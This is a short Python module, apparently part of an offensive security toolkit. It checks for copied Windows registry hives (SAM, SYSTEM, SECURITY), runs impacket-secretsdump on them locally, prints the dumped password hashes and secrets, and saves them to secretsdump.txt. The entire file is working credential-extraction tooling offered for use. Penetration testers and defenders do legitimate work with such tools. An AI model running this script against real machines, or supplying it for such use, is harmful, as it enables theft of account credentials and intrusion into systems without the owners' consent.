import subprocess
from pathlib import Path


def run(data, cred, args):
    # --- COLORS ---
    G, C, B, Y, W, R = '\033[92m', '\033[96m', '\033[94m', '\033[93m', '\033[0m', '\033[91m'
    BOLD = '\033[1m'

    required = ["SAM", "SYSTEM", "SECURITY"]
    missing = [f for f in required if not Path(f).exists()]

    if missing:
        print(f"\n{R}[!] {W}{BOLD}MISSING HIVES{W}")
        for hive in missing:
            print(f"{B}  └── {hive}")
        return

    print(f"\n{B}┌── {BOLD}MODULE: OFFLINE HIVE DUMP{W}{B} ──────────────────────┐{W}")
    print(f"{B}│{W}  {B}SAM:{W}       {'FOUND':<36}{B}│{W}")
    print(f"{B}│{W}  {B}SYSTEM:{W}    {'FOUND':<36}{B}│{W}")
    print(f"{B}│{W}  {B}SECURITY:{W}  {'FOUND':<36}{B}│{W}")
    print(f"{B}└──────────────────────────────────────────────────────────┘{W}")

    cmd = [
        "impacket-secretsdump",
        "-sam", "SAM",
        "-system", "SYSTEM",
        "-security", "SECURITY",
        "LOCAL"
    ]

    print(f"\n{B}[{W}{G}*{W}{B}]{W} Running secretsdump...\n")

    result = subprocess.run(
        cmd,
        capture_output=True,
        text=True
    )

    if result.returncode != 0:
        print(f"{R}[!] secretsdump failed{W}")
        print(result.stderr)
        return

    print(result.stdout)

    output_file = Path("secretsdump.txt")
    output_file.write_text(result.stdout)

    print(f"\n{G}[+] Output saved:{W} {output_file.resolve()}\n")
